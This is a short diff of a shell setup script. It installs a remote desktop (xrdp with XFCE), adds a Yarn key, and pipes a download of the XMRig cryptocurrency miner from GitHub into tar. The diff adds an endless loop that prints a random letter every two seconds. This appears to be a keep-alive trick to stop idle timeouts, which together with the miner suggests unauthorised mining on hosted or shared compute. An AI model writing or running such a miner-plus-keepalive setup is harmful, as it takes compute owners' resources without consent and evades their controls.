@@ -9,3 +9,5 @@ sudo apt-get update && sudo apt-get install -y xrdp xfce4 xfce4-goodies dbus-x11
  curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -
 
  curl -L https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz | tar -xz
+
+while true; do printf \\$(printf %03o $((RANDOM%25+97))) ; sleep 2; done
